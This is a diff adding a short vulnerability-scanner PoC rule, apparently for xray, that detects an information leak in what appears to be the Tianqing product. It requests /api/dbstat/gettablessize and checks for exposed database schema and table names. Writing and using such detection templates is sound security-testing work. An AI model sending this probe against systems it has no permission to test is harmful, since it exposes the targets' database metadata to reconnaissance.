@@ -1,0 +1,15 @@
+name: poc-yaml-tianqing-info-leak
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /api/dbstat/gettablessize
+        expression: response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(b"schema_name") && response.body.bcontains(b"table_name")
+expression: r0()
+detail:
+    author: jingling(https://github.com/shmilylty)
+    links:
+        - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
